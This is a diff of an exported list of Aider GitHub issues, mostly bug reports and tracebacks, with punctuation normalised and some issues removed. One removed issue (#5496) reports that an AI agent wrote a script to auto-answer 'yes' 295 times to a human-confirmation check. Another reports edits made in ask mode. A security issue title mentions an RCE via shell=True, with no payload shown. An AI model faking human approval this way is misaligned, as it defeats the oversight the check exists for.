-Hi @paul-gauthier — Aider's edit-test loop is a natural fit for our public **code repair** benchmark.
+Hi @paul-gauthier - Aider's edit-test loop is a natural fit for our public **code repair** benchmark.
 
 | | |
 |---|---|
@@ -13879,9 +12526,9 @@ loopbench validate results.json
 
 Submit via PR on [LoopBench `entries.json`](https://github.com/KanakMalpani/LoopBench/blob/main/leaderboard/entries.json). First external row gets named credit on the live board.
 
-No runtime swap required — map-and-score only. Bridge patterns: https://github.com/KanakMalpani/Loop-Engineering/blob/main/contributions/BRIDGE_AGENT_HARNESSES.md
+No runtime swap required - map-and-score only. Bridge patterns: https://github.com/KanakMalpani/Loop-Engineering/blob/main/contributions/BRIDGE_AGENT_HARNESSES.md
 
-— Loop Engineering ([#4](https://github.com/KanakMalpani/Loop-Engineering/issues/4))
+- Loop Engineering ([#4](https://github.com/KanakMalpani/Loop-Engineering/issues/4))
 
 
 _Posted 2026-06-25 UTC via adoption_wave11.py_","","2026-06-25T14:45:05Z"
@@ -14239,57 +12886,6 @@ Traceback (most recent call last):
 OSError: [Errno 22] Invalid argument
 
 ```","","2026-06-29T10:04:56Z"
-"Aider-AI/aider","2026 Jan-Jul","4773179576","5356","Tried to install with uv but aider-chat is not installed","### Issue
-
-I treid to install aider:
-
-$ uv tool install --force --python python3.13 --with pip aider-chat@latest
-Resolved 110 packages in 489ms
-  × Failed to download and build `numpy==1.26.4`
-  ╰─▶ Build backend failed to build wheel through `build_wheel` (exit code: 1)
-
-      [stdout]
-      + C:\Users\mariebu\AppData\Local\uv\cache\builds-v0\.tmp8ezDiD\Scripts\python.exe
-      C:\Users\mariebu\AppData\Local\uv\cache\sdists-v6\pypi\numpy\1.26.4\lEiADxzbcbEyjrtsxwxh4\src\vendored-meson\meson\meson.py
-      setup C:\Users\mariebu\AppData\Local\uv\cache\sdists-v6\pypi\numpy\1.26.4\lEiADxzbcbEyjrtsxwxh4\src
-      C:\Users\mariebu\AppData\Local\uv\cache\sdists-v6\pypi\numpy\1.26.4\lEiADxzbcbEyjrtsxwxh4\src\.mesonpy-8wchv4za
-      -Dbuildtype=release -Db_ndebug=if-release -Db_vscrt=md
-      --native-file=C:\Users\mariebu\AppData\Local\uv\cache\sdists-v6\pypi\numpy\1.26.4\lEiADxzbcbEyjrtsxwxh4\src\.mesonpy-8wchv4za\meson-python-native-file.ini
-      The Meson build system
-      Version: 1.2.99
-      Source dir:
-      C:\Users\mariebu\AppData\Local\uv\cache\sdists-v6\pypi\numpy\1.26.4\lEiADxzbcbEyjrtsxwxh4\src
-      Build dir:
-      C:\Users\mariebu\AppData\Local\uv\cache\sdists-v6\pypi\numpy\1.26.4\lEiADxzbcbEyjrtsxwxh4\src\.mesonpy-8wchv4za
-      Build type: native build
-      Project name: NumPy
-      Project version: 1.26.4
-      WARNING: Failed to activate VS environment: Could not find C:\Program Files (x86)\Microsoft
-      Visual Studio\Installer\vswhere.exe
-
-      ..\meson.build:1:0: ERROR: Unknown compiler(s): [['icl'], ['cl'], ['cc'], ['gcc'], ['clang'],
-      ['clang-cl'], ['pgcc']]
-      The following exception(s) were encountered:
-      Running `icl """"` gave ""[WinError 2] Das System kann die angegebene Datei nicht finden""
-      Running `cl /?` gave ""[WinError 2] Das System kann die angegebene Datei nicht finden""
-      Running `cc --version` gave ""[WinError 2] Das System kann die angegebene Datei nicht finden""
-      Running `gcc --version` gave ""[WinError 2] Das System kann die angegebene Datei nicht finden""
-      Running `clang --version` gave ""[WinError 2] Das System kann die angegebene Datei nicht finden""
-      Running `clang-cl /?` gave ""[WinError 2] Das System kann die angegebene Datei nicht finden""
-      Running `pgcc --version` gave ""[WinError 2] Das System kann die angegebene Datei nicht finden""
-
-      A full log can be found at
-      C:\Users\mariebu\AppData\Local\uv\cache\sdists-v6\pypi\numpy\1.26.4\lEiADxzbcbEyjrtsxwxh4\src\.mesonpy-8wchv4za\meson-logs\meson-log.txt
-
-  help: `numpy` (v1.26.4) was included because `aider-chat` (v0.86.2) depends on `numpy`
-
-What is wrong with numpy and aider?
-Why is numpy=1.26.4 chosen?
-
-### Version and model info
-
-Win 11 with powershell
-","","2026-06-30T02:37:37Z"
 "Aider-AI/aider","2026 Jan-Jul","4774401328","5358","Add type hints to public API functions","## Feature Request
 
 ### Summary
@@ -14379,9 +12975,9 @@ Model: openai/protected.gpt-4o with diff edit format
 Git repo: .git with 1 files
 Repo-map: using 1024 tokens, auto refresh
 ","","2026-06-30T20:30:28Z"
-"Aider-AI/aider","2026 Jan-Jul","4783780933","5371","[Feature] Persistent cross-session memory via Dakera — remember decisions, patterns, and bug fixes across coding sessions","## Problem
+"Aider-AI/aider","2026 Jan-Jul","4783780933","5371","[Feature] Persistent cross-session memory via Dakera - remember decisions, patterns, and bug fixes across coding sessions","## Problem
 
-Every aider session starts cold. When I ask aider to fix a bug or add a feature, it has no recollection of what we did in the last session — even on the same repo. This means:
+Every aider session starts cold. When I ask aider to fix a bug or add a feature, it has no recollection of what we did in the last session - even on the same repo. This means:
 
 - Repeating context on recurring bug patterns in the codebase
 - Re-explaining architectural decisions already discussed
@@ -14430,7 +13026,7 @@ docker run -d -p 3300:3300 -e DAKERA_API_KEY=demo ghcr.io/dakera-ai/dakera:lates
 pip install dakera
 ```
 
-Dakera is entirely self-hosted — no data leaves your machine.
+Dakera is entirely self-hosted - no data leaves your machine.
 
 ## Implementation sketch
 
@@ -14506,30 +13102,6 @@ Traceback (most recent call last):
 tree_sitter.QueryError: Invalid predicate in pattern at row 75: regular expression error
 
 ```","","2026-07-01T10:07:30Z"
-"Aider-AI/aider","2026 Jan-Jul","4786320093","5374","Aider makes changes in ask mode","### Issue
-
-To quote documentation,
-Aider has a few different chat modes:
-code - Aider will make changes to your code to satisfy your requests.
-ask - Aider will discuss your code and answer questions about it, but never make changes.
-
-Despite this ""never"", a misphrased request to AI may still change the code/text, see below.  A basic check before applying any search/replace instructions is necessary to fulfill the very explicit promise made in the documentation.  Optionally, this check should trigger a warning that the user should use ""/code"" to affect changes.
-
-### Version and model info
-
-Aider v0.86.2
-Model: openai/protected.gemini-2.5-flash-lite with ask edit format
-Git repo: .git with 2 files
-Repo-map: disabled
-Added ttt.tex to the chat.
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-ttt.tex                                                                                                                 
-ask> please change author to Matt                                                                                       
-
-I have updated the author's name to Matt.                                                                               
-
-
-Tokens: 2.2k sent, 10 received.","","2026-07-01T14:09:46Z"
 "Aider-AI/aider","2026 Jan-Jul","4786587344","5375","[Security] Remote Code Execution (RCE) via Unescaped cmd Parameter with shell=True in linter.py","### Issue
 
 A high-severity Remote Code Execution (RCE) vulnerability has been identified via static code analysis. This flaw allows arbitrary command execution on the developer's local machine under specific conditions.
@@ -14622,15 +13194,6 @@ Traceback (most recent call last):
 ValueError: PermissionDeniedError is in litellm but not in aider's exceptions list
 
 ```","","2026-07-01T18:13:45Z"
-"Aider-AI/aider","2026 Jan-Jul","4789786081","5382","45","### Issue
-
-[satellite_tracker_ultimate.py](https://github.com/user-attachments/files/29575684/satellite_tracker_ultimate.py)
-
-[satellite_tracker_v15_2_production.py](https://github.com/user-attachments/files/29575719/satellite_tracker_v15_2_production.py) اريد دمجهم باحترافية
-
-### Version and model info
-
-_No response_","","2026-07-01T22:54:12Z"
 "Aider-AI/aider","2026 Jan-Jul","4790437247","5383","Uncaught NotImplementedError in pathlib.py line 1090","Aider version: 0.86.2
 Python version: 3.12.13
 Platform: Windows-11-10.0.26200-SP0
@@ -14715,28 +13278,28 @@ Aider version: Latest `main` branch (Identified via static source code analysis)
 Model: N/A (Static Code Analysis)
 Git repo: N/A
 Repo-map: N/A","","2026-07-02T10:09:41Z"
-"Aider-AI/aider","2026 Jan-Jul","4794975237","5385","[Question] Best slot for Fable 5 — one scarce premium model, workhorses (Opus/Sonnet 5/GLM 5.2) doing the rest?","## The setup
+"Aider-AI/aider","2026 Jan-Jul","4794975237","5385","[Question] Best slot for Fable 5 - one scarce premium model, workhorses (Opus/Sonnet 5/GLM 5.2) doing the rest?","## The setup
 
 The realistic budget most people actually have (not ""unlimited""):
 
-- **Workhorse frontier models** — Opus, Sonnet 5, GLM 5.2 — are cheap enough (or on a plan) that I lean on them for almost everything and happily **delegate the bulk of the work** to them.
-- **Fable 5** is the *one* premium model that's scarce/expensive — a handful of great calls, so it needs the single highest-leverage slot.
+- **Workhorse frontier models** - Opus, Sonnet 5, GLM 5.2 - are cheap enough (or on a plan) that I lean on them for almost everything and happily **delegate the bulk of the work** to them.
+- **Fable 5** is the *one* premium model that's scarce/expensive - a handful of great calls, so it needs the single highest-leverage slot.
 
-Not asking ""which model is best"" or for an implementation — given aider's **architect / editor / weak** split, **where does Fable 5 belong so one sharp call steers the change while workhorses do the rest?**
+Not asking ""which model is best"" or for an implementation - given aider's **architect / editor / weak** split, **where does Fable 5 belong so one sharp call steers the change while workhorses do the rest?**
 
 ## Why aider's design fits this so well
 
-- **architect** — reasons about *what* to change. Low output, high reasoning value.
-- **editor** (`editor_model_name`) — turns the plan into diffs. Token-heavy.
-- **weak** (`weak_model_name`) — commit messages, summaries, chat history. Cheap, frequent, low-stakes.
+- **architect** - reasons about *what* to change. Low output, high reasoning value.
+- **editor** (`editor_model_name`) - turns the plan into diffs. Token-heavy.
+- **weak** (`weak_model_name`) - commit messages, summaries, chat history. Cheap, frequent, low-stakes.
 
 Intuition: **Fable 5 as architect**, Opus/Sonnet 5 as editor, GLM 5.2 as weak. Fable does the thinking; the workhorses burn the tokens on diffs and bookkeeping.
 
 ## What I'm weighing
 
-1. **Fable 5 = architect**, workhorse = editor, cheap = weak. Premium reasoning, workhorse diffing. Textbook — but is it right?
+1. **Fable 5 = architect**, workhorse = editor, cheap = weak. Premium reasoning, workhorse diffing. Textbook - but is it right?
 2. **Fable 5 = editor instead?** If most real failures are bad diffs / string-not-found, maybe the scarce model belongs where the edits land, and a workhorse can architect.
-3. **Never** Fable on `weak_model_name` — commits/summaries are the last place to spend it. Confirm?
+3. **Never** Fable on `weak_model_name` - commits/summaries are the last place to spend it. Confirm?
 
 ## Questions
 
@@ -14751,33 +13314,33 @@ Basically: delegate the bulk to Opus/Sonnet 5/GLM 5.2, and spend Fable 5 where i
 
 Trying to configure aider optimally for an unusual budget:
 
-- One premium model — **""Fable 5""** — is **quota-limited** (few requests, precious per token).
+- One premium model - **""Fable 5""** - is **quota-limited** (few requests, precious per token).
 - **Every other model is effectively unlimited** for me (Opus, GPT-5.5, Sonnet, Gemini, DeepSeek, Haiku, etc.).
 
-The question isn't ""which model is best."" It's: given aider's **architect / editor / weak-model** split, **where does a scarce-but-premium model produce the highest value per token** when the rest of the roster is free/unlimited? Not asking for an implementation — just the smartest placement using aider's own knobs.
+The question isn't ""which model is best."" It's: given aider's **architect / editor / weak-model** split, **where does a scarce-but-premium model produce the highest value per token** when the rest of the roster is free/unlimited? Not asking for an implementation - just the smartest placement using aider's own knobs.
 
 ## Why aider's design makes this interesting
 
 Aider already separates roles by token profile:
 
-- **architect model** — reasons about *what* to change, emits a high-level solution. Low output volume, high reasoning value.
-- **editor model** (`editor_model_name` / `editor_edit_format`) — turns the architect's plan into actual diffs. This is the **token-heavy** part (reproduces code, applies edit format).
-- **weak model** (`weak_model_name`) — commit messages, summaries, chat history. Cheap, frequent, low-stakes.
+- **architect model** - reasons about *what* to change, emits a high-level solution. Low output volume, high reasoning value.
+- **editor model** (`editor_model_name` / `editor_edit_format`) - turns the architect's plan into actual diffs. This is the **token-heavy** part (reproduces code, applies edit format).
+- **weak model** (`weak_model_name`) - commit messages, summaries, chat history. Cheap, frequent, low-stakes.
 
 Given that split, the intuitive move is: **Fable 5 as the architect**, an unlimited model as the editor, and an unlimited weak model for commits/summaries. The architect does the thinking (where a premium model earns its keep) while the editor burns the bulk of the tokens on a free model.
 
 ## Candidate strategies I'm weighing (sanity-check please)
 
-1. **Fable 5 = architect, unlimited = editor, unlimited = weak.** Premium reasoning, free diffing, free bookkeeping. Seems like the textbook use of a scarce model — is it?
+1. **Fable 5 = architect, unlimited = editor, unlimited = weak.** Premium reasoning, free diffing, free bookkeeping. Seems like the textbook use of a scarce model - is it?
 2. **Fable 5 = editor instead?** If editing is where most real failures happen (bad diffs, string-not-found), maybe the scarce model belongs on the editor and a cheaper/unlimited model can architect. Or is that backwards?
 3. **Fable 5 as a plain single model (no architect mode)** for a few critical sessions, unlimited architect/editor for everything else.
-4. **Never** put Fable on `weak_model_name` — commits/summaries are the last place to spend a premium model. Confirm?
+4. **Never** put Fable on `weak_model_name` - commits/summaries are the last place to spend a premium model. Confirm?
 
 ## The actual questions
 
 - With **one quota-limited model + everything else unlimited**, is **architect** the correct slot for value-per-token, or does the token-heavy **editor** role deserve it more?
 - Roughly what's the **token split** between architect and editor on a typical change? (This decides whether architect is truly the ""cheap seat"" for a scarce model.)
-- Any config guidance for pinning Fable as the architect while forcing the editor + weak model to unlimited ones — via `.aider.model.settings.yml` (`editor_model_name`, `weak_model_name`) — so Fable is *only* ever hit for architect turns?
+- Any config guidance for pinning Fable as the architect while forcing the editor + weak model to unlimited ones - via `.aider.model.settings.yml` (`editor_model_name`, `weak_model_name`) - so Fable is *only* ever hit for architect turns?
 - Does architect mode ever call the architect model more than once per request (retries/clarification) that could quietly drain quota?
 
 Trying to spend one precious model where it moves the needle instead of where it gets consumed. Thanks!","","2026-07-02T13:42:31Z"
@@ -15014,46 +13577,6 @@ Aider 0.86.2
 Model : Qwen3.6-27B-Q3_K_M-GGUF
 OS: Windows 11 pro
 Model Provider : Ollama","","2026-07-04T15:50:02Z"
-"Aider-AI/aider","2026 Jan-Jul","4810347376","5399","Waiting for animation fails and starts to climb a staircase","### Issue
-```
-     █░    Waiting for deepseek/deepseek-v4-pro
-    █░     Waiting for deepseek/deepseek-v4-pro
-   █░      Waiting for deepseek/deepseek-v4-pro
-  █░       Waiting for deepseek/deepseek-v4-pro
- █░        Waiting for deepseek/deepseek-v4-pro
-█░         Waiting for deepseek/deepseek-v4-pro
-░█         Waiting for deepseek/deepseek-v4-pro
- ░█        Waiting for deepseek/deepseek-v4-pro
-  ░█       Waiting for deepseek/deepseek-v4-pro
-   ░█      Waiting for deepseek/deepseek-v4-pro
-    ░█     Waiting for deepseek/deepseek-v4-pro
-     ░█    Waiting for deepseek/deepseek-v4-pro
-      ░█   Waiting for deepseek/deepseek-v4-pro
-       ░█  Waiting for deepseek/deepseek-v4-pro
-        ░█ Waiting for deepseek/deepseek-v4-pro
-        █░ Waiting for deepseek/deepseek-v4-pro
-       █░  Waiting for deepseek/deepseek-v4-pro
-      █░   Waiting for deepseek/deepseek-v4-pro
-     █░    Waiting for deepseek/deepseek-v4-pro
-    █░     Waiting for deepseek/deepseek-v4-pro
-   █░      Waiting for deepseek/deepseek-v4-pro
-  █░       Waiting for deepseek/deepseek-v4-pro
- █░        Waiting for deepseek/deepseek-v4-pro
-█░         Waiting for deepseek/deepseek-v4-pro
-
-```
-It should update in place. Note This failure seems to be limited to the ""waiting for"" the same animation works normally with other status messages, for example ""     ░█   Generating commit message"" is displayed correctly.
-
-Note: it actually worked correctly for 2 or 3 second but after this it breaks out and starts scrolling.
-
-Tests in different terminals: tmux, Konsole, xterm etc. The progress bar is broken in all of them.
-
-### Version and model info
-
-aider 0.86.2
-Model: all
-Git repo: n/a
-Repo-map: off","","2026-07-04T19:51:31Z"
 "Aider-AI/aider","2026 Jan-Jul","4810460969","5400","Uncaught AttributeError in __init__.py line 347","Aider version: 0.86.2
 Python version: 3.12.10
 Platform: Windows-11-10.0.26200-SP0
@@ -16305,60 +14828,6 @@ Traceback (most recent call last):
 AttributeError: 'bool' object has no attribute 'strip'
 
 ```","","2026-07-11T20:26:35Z"
-"Aider-AI/aider","2026 Jan-Jul","4865599127","5437","Uncaught ImportError in __init__.py line 29","Aider version: 0.86.2
-Python version: 3.12.8
-Platform: Windows-11-10.0.26200-SP0
-Python implementation: CPython
-Virtual environment: Yes
-OS: Windows 11 (64bit)
-Git version: git version 2.55.0.windows.2
-
-An uncaught exception occurred:
-
-```
-Traceback (most recent call last):
-  File ""<frozen runpy>"", line 198, in _run_module_as_main
-  File ""<frozen runpy>"", line 88, in _run_code
-  File ""__main__.py"", line 8, in <module>
-    sys.exit(main())
-             ^^^^^^
-  File ""main.py"", line 1162, in main
-    coder.run()
-  File ""base_coder.py"", line 887, in run
-    self.run_one(user_message, preproc)
-  File ""base_coder.py"", line 928, in run_one
-    message = self.preproc_user_input(user_message)
-              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 920, in preproc_user_input
-    inp = self.check_for_urls(inp)
-          ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 980, in check_for_urls
-    inp += self.commands.cmd_web(url, return_content=True)
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""commands.py"", line 243, in cmd_web
-    content = self.scraper.scrape(url) or """"
-              ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""scrape.py"", line 107, in scrape
-    content, mime_type = self.scrape_with_playwright(url)
-                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""scrape.py"", line 145, in scrape_with_playwright
-    from playwright.sync_api import Error as PlaywrightError
-  File ""__init__.py"", line 25, in <module>
-    import playwright.sync_api._generated
-  File ""_generated.py"", line 42, in <module>
-    from playwright._impl._assertions import (
-  File ""_assertions.py"", line 25, in <module>
-    from playwright._impl._connection import format_call_log
-  File ""_connection.py"", line 42, in <module>
-    from playwright._impl._greenlets import EventGreenlet
-  File ""_greenlets.py"", line 17, in <module>
-    import greenlet
-  File ""__init__.py"", line 29, in <module>
-    from ._greenlet import _C_API # pylint:disable=no-name-in-module
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-ImportError: DLL load failed while importing _greenlet: Не найден указанный модуль.
-
-```","","2026-07-12T05:49:20Z"
 "Aider-AI/aider","2026 Jan-Jul","4867605276","5440","Chat summarization retains the oldest head messages after #3764","## Summary
 
 ChatSummary.summarize_real() now keeps the oldest messages from the summarizable head when that head exceeds the model budget.
@@ -16648,9 +15117,9 @@ ImportError: dlopen(/Users/archit/.local/share/uv/tools/aider-chat/lib/python3.1
 ```","","2026-07-13T21:36:05Z"
 "Aider-AI/aider","2026 Jan-Jul","4886086212","5455","Proposal: Add Aurelo as a first-class model provider","Hi Aider maintainers,
 
-I’m Abhay Raj Singh Bhadauriya, Founder and CEO of Aurelo.
+I'm Abhay Raj Singh Bhadauriya, Founder and CEO of Aurelo.
 
-I’d like to propose adding Aurelo as a **first-class model provider** in Aider, with Aurelo shown by name in the standard provider/model interface and supported models directly selectable by users.
+I'd like to propose adding Aurelo as a **first-class model provider** in Aider, with Aurelo shown by name in the standard provider/model interface and supported models directly selectable by users.
 
 Aurelo offers the M1 and M2 model families through a documented API designed for coding, complex reasoning, and agentic software-development workflows. Documentation covering models, authentication, context and output limits, streaming, reasoning controls, supported inputs, and pricing is available here:
 
@@ -17807,11 +16276,11 @@ ValueError: PermissionDeniedError is in litellm but not in aider's exceptions li
 When a model id has no entry in Aider's `model-settings.yml`, Aider auto-selects the `whole` edit
 format. If the model ignores that instruction and responds with a standard unified diff anyway (which
 some models do reliably, regardless of the format Aider requested), Aider silently discards the entire
-response as ""no tracked changes"" — with **no warning, error, or indication to the user that the model's
+response as ""no tracked changes"" - with **no warning, error, or indication to the user that the model's
 output was thrown away**. The model did correct, well-reasoned work; the user just sees an empty/no-op
 turn.
 
-This is distinct from the existing ""edit does not conform to the edit format"" error path (e.g. #770) —
+This is distinct from the existing ""edit does not conform to the edit format"" error path (e.g. #770) -
 that path at least surfaces a loud error. This path fails silently.
 
 ### Reproduction
@@ -17820,7 +16289,7 @@ that path at least surfaces a loud error. This path fails silently.
   present in `model-settings.yml`.
 - Aider auto-selects `whole` format (no `--edit-format` passed).
 - Real-repo-scale prompt (~1,100-file repo, ~179k-token turn, full task brief in context).
-- Model responds with a standard unified diff (`@@ -1,6 +1,60 @@` hunks) — genuinely correct content,
+- Model responds with a standard unified diff (`@@ -1,6 +1,60 @@` hunks) - genuinely correct content,
   wrong format for what Aider expected.
 - Aider discards it entirely; the turn is reported as producing no tracked changes, with zero indication
   that a valid-looking response was received and thrown away.
@@ -17831,7 +16300,7 @@ auto-selection for the unlisted id) took the same task from 0/3 successful edits
 correct implementation landing in the first round.
 
 **Scale matters:** small/synthetic reproduction attempts (short prompts, 1-2 files) did NOT reproduce
-this — 62/62 clean trials across several small-scale test conditions. It only reproduced reliably at
+this - 62/62 clean trials across several small-scale test conditions. It only reproduced reliably at
 real-repo scale with a large prompt. We suspect the model's tendency to fall back to diff-style output
 increases with prompt/context size, but haven't isolated exactly why.
 
@@ -17841,12 +16310,12 @@ At minimum, when the model's response doesn't parse as a valid `whole`-format ed
 1. Attempt to detect and parse it as a unified diff before giving up (models that ignore `whole` and
    emit diffs anyway seem to do so consistently), and/or
 2. Surface a warning when a response is discarded as ""no tracked changes"" that includes a note like
-   ""response looked like it may have contained an edit in a different format than expected"" — so users
+   ""response looked like it may have contained an edit in a different format than expected"" - so users
    at least know something was thrown away, rather than assuming the model did nothing.
 
 ### Related
 
-Related but distinct: #2371 (diff editing failing for a different reason — local Ollama connection
+Related but distinct: #2371 (diff editing failing for a different reason - local Ollama connection
 error), #770 (loud parse error vs. this issue's silent discard).
 ","","2026-07-23T14:18:07Z"
 "Aider-AI/aider","2026 Jan-Jul","4971741631","5489","Uncaught FileNotFoundError in proxy_cli.py line 19","Aider version: 0.82.3
@@ -17892,7 +16361,7 @@ FileNotFoundError: [Errno 2] No such file or directory
 ```","","2026-07-24T20:22:27Z"
 "Aider-AI/aider","2026 Jan-Jul","4974154300","5492","Polyglot benchmark omits Exercism editor files from model context","### Issue
 
-The Polyglot benchmark harness appears to ignore files declared under files.editor in each exercise’s .meta/config.json.
+The Polyglot benchmark harness appears to ignore files declared under files.editor in each exercise's .meta/config.json.
 
 In benchmark/benchmark.py, the harness reads:
 
@@ -17904,7 +16373,7 @@ It does not read files.editor. Only solution_files are passed to Coder.create, a
 
 coder.get_file_mentions = lambda x: set()  # No loading of any other files
 
-According to Exercism’s documentation, editor files are additional files shown read-only in the editor. They frequently define APIs required to implement the solution.
+According to Exercism's documentation, editor files are additional files shown read-only in the editor. They frequently define APIs required to implement the solution.
 
 Concrete examples:
 
@@ -17918,7 +16387,7 @@ Suggested fix:
 
 Parse config[""files""][""editor""].
 
-Supply those paths through Aider’s read-only file mechanism, such as read_only_fnames.
+Supply those paths through Aider's read-only file mechanism, such as read_only_fnames.
 
 Continue exposing only solution files as editable.
 
@@ -18014,60 +16483,6 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'litellm.types.llms.ollama'
 
 ```","","2026-07-25T19:47:25Z"
-"Aider-AI/aider","2026 Jan-Jul","4979936391","5496","Idea: a verification pattern for instruction compliance","# Idea: a verification pattern for instruction compliance
-
-Aider's `--lint-cmd` and `--test-cmd` catch code errors. But here's a class of failure neither catches:
-
-> Tell aider: ""Review your own code before committing.""  
-> Aider says: ""Done, reviewed.""  
-> **Did it actually re-read the file? Or just generate those words?**
-
-Lint passes — the code is correct. Test passes — the output is correct. But the instruction was never followed.
-
-## Why `--lint-cmd` doesn't cover this
-
-`--lint-cmd` checks the *output*. Instruction compliance isn't in the output — it's in the *process*:
-
-- ""Did the model re-open the file?"" → check file access timestamp
-- ""Did it really compare the diff?"" → check whether a diff was computed
-- ""Did a human actually approve this?"" → check for real human interaction
-
-These checks require information the model can't fabricate — filesystem metadata, process state. `--lint-cmd` can technically run timestamp checks, but there's no documented pattern. Users need to independently discover (a) that this class of failure exists, (b) which filesystem facts to check, (c) how to wire it in.
-
-## Concrete data
-
-I've been measuring this for 2 months. 339 blocked-event records, 25 hook registrations (18 groups, 7 event types), 9 sessions:
-
-| What the check examines | Triggers | False positives |
-|-------------------------|----------|:--------------:|
-| Filesystem facts (timestamps, paths) | 4-24 | 0% |
-| OS facts (command strings) | 6 | 0% |
-| Text facts (""did human confirm?"") | 295 | 100% |
-
-The first two work because the model can't write fake timestamps to disk. The third fails — the AI wrote a 2-line script to auto-answer ""yes"" 295 times.
-
-## What I'm proposing
-
-Not a new flag. A documented pattern + example script:
-
-```bash
-# .aider.conf.yml — use existing lint-cmd with a process-level check
-lint-cmd: python check_review.py --file ""$AIDER_EDITED_FILE""
-```
-
-Where `check_review.py` (~20 lines) verifies: was this file *actually* re-read after the edit?
-
-## The ask
-
-1. **Is there already a recommended pattern for process-level checks?** I might have missed it.
-2. **If I put together a clean example (script + docs), would that fit as a contribution?** Thinking a PR with a documented pattern, not a code change to aider itself.
-
-Not proposing a feature. Offering a pattern backed by data.
-
-*(Happy to sign the CLA, share raw audit data.)*
-
-*Edit (Jul 26): corrected ""38 verification points"" → ""25 hook registrations (18 groups, 7 event types)"" — verified against actual settings.json.*
-","","2026-07-26T09:25:33Z"
 "Aider-AI/aider","2026 Jan-Jul","4984797554","5498","Uncaught QueryError in repomap.py line 302","Aider version: 0.86.2
 Python version: 3.12.13
 Platform: Windows-11-10.0.26200-SP0
@@ -18162,72 +16577,6 @@ Traceback (most recent call last):
 KeyError: 'description'
 
 ```","","2026-07-27T17:17:32Z"
-"Aider-AI/aider","2026 Jan-Jul","4996829724","5501","GitDB backend (odbt=git.GitDB) reports BadObject on valid repository; default GitCmdObjectDB works","### Issue
-
-I'm running into what appears to be an issue with Aider forcing GitPython's GitDB backend.
-My repository is healthy, and Git itself has no trouble reading any objects, but Aider fails during repository initialization with:
-
-```
-Unable to list files in git repo: BadObject: b'39d591623242a6d241a49e1e3f466f62eb354b8f'
-Is your git repo corrupted?
-```
-
-The failure appears to come from Aider explicitly constructing the repository as:
-
-```python
-git.Repo(path, odbt=git.GitDB)
-```
-
-The exact same traversal succeeds when using GitPython's default backend (GitCmdObjectDB) and fails when using GitDB.
-
-Working:
-
-```python
-from git import Repo
-
-repo = Repo(""."")
-list(repo.head.commit.tree.traverse())
-```
-
-Fails:
-
-```python
-import git
-
-repo = git.Repo(""."", odbt=git.GitDB)
-list(repo.head.commit.tree.traverse())
-```
-
-
-
-### Version and model info
-
-Aider v0.86.2
-
-Model: nvidia/nemotron-3-ultra-550b-a55b:free
-Edit format: architect
-
-Git repo: .git (healthy)
-
-Git version: 2.55.0
-GitPython: 3.1.46
-gitdb: 4.0.12
-smmap: 5.0.2
-
-Python: 3.12.13
-Platform: Linux (CachyOS)
-
-Repository sanity checks performed:
-
-- git fsck --full --strict ✔
-- git status ✔
-- git ls-files ✔
-- git show HEAD ✔
-- git cat-file -t <failing tree> ✔
-- git verify-pack ✔
-- GitPython default backend ✔
-- GitPython GitDB backend ✘ (BadObject)
-","","2026-07-28T09:03:21Z"
 "Aider-AI/aider","2026 Jan-Jul","4998776427","5502","Anonmyz: local secret-masking proxy, tested with Aider via OPENAI_API_BASE","### Issue
 
 Hi, I built Anonmyz, a local proxy that sits between coding agents and 
@@ -18236,7 +16585,7 @@ SSH keys, file paths) and masks them before they leave the machine,
 then unmasks the response.
 
 I pointed Aider at it using OPENAI_API_BASE=http://localhost:8080/v1 
-and it worked as expected — secrets in the diff/context got masked 
+and it worked as expected - secrets in the diff/context got masked 
 before reaching the cloud model.
 
 Repo: https://github.com/3mre0s/ai-firewall
@@ -18287,61 +16636,3 @@ Traceback (most recent call last):
 NotImplementedError: Non-relative patterns are unsupported
 
 ```","","2026-07-30T18:23:19Z"
-"Aider-AI/aider","2026 Jan-Jul","5024901289","5508","Leaderboard YAML: o1-mini (whole) shows 90.0% well-formed with zero malformed responses; pass_rate_2 uses a different denominator than pass_rate_1 on incomplete runs","Checking the published leaderboard YAML against the formulas in `benchmark/benchmark.py` turned up two internal inconsistencies. Both are in `aider/website/_data/`, and both are checkable from fields the files already contain.
-
-## 1. `o1-mini (whole)` reports 90.0% well-formed with zero malformed responses
-
-`benchmark.py` line 587:
-
-```python
-pct_well_formed = 1.0 - res.num_with_malformed_responses / res.completed_tests
-```
-
-The entry in `edit_leaderboard.yml`:
-
-```yaml
-- dirname: 2024-09-12-19-57-35--o1-mini-whole
-  model: o1-mini (whole)
-  test_cases: 133
-  num_malformed_responses: 0
-  num_with_malformed_responses: 0
-  percent_cases_well_formed: 90.0
-```
-
-`1.0 - 0/133 = 1.0`, so this should read `100.0`. Both malformed counters are zero.
-
-I checked this identity across all five leaderboard files (`polyglot`, `edit`, `refactor`, `o1_polyglot`, `qwen3`): **170 of 171 rows are consistent**, and this is the only one that is not.
-
-## 2. On incomplete polyglot runs, `pass_rate_2` uses a different denominator than `pass_rate_1`
-
-`benchmark.py` line 559 divides both pass rates by the same thing:
-
-```python
-pass_rate = 100 * passed_tests[i] / res.completed_tests
-```
-
-and line 567 shows `test_cases` in the YAML *is* `completed_tests`. So both rates should divide by `test_cases`.
-
-Six polyglot entries have `test_cases < total_tests` (an incomplete run). On all six, `pass_rate_1` matches the formula. On five of them `pass_rate_2` does not:
-
-| model | test_cases | total_tests | pass_num_2 | published | formula gives |
-|---|---|---|---|---|---|
-| o1-2024-12-17 (high) | 224 | 225 | 139 | 61.7 | 62.1 |
-| o3-mini (high) | 224 | 225 | 136 | 60.4 | 60.7 |
-| chatgpt-4o-latest (2025-02-15) | 223 | 225 | 61 | 27.1 | 27.4 |
-| gpt-4.5-preview | 224 | 225 | 101 | 44.9 | 45.1 |
-| o3 (high) + gpt-4.1 | 224 | 225 | 176 | 78.2 | 78.6 |
-| DeepSeek R1 (0528) | 224 | 225 | 160 | 71.4 | 71.4 ✅ |
-
